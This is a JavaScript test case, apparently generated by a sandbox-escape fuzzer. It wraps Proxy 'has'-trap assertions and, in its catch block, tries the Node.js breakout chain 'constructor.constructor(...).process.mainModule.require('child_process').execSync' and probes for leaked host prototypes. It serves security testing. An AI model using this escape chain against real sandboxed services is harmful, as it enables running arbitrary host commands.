try {
    var plainObject = {
        get 0() {
            return 1;
        },
        foo: 2,
        set bar(_value) {
        }
    };
    var plainObjectTarget = new Proxy(plainObject, {});
    var plainObjectProxy = new Proxy(plainObjectTarget, { get: undefined });
    assert(0 in Object.create(plainObjectProxy));
    assert('foo' in plainObjectProxy);
    assert(Reflect.has(plainObjectProxy, 'bar'));
    var arrayTarget = new Proxy([
        1,
        2
    ], {});
    var arrayProxy = new Proxy(arrayTarget, { get: undefined });
    assert('length' in Object.create(arrayProxy));
    assert('1' in arrayProxy);
    assert(!('2' in arrayProxy));
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}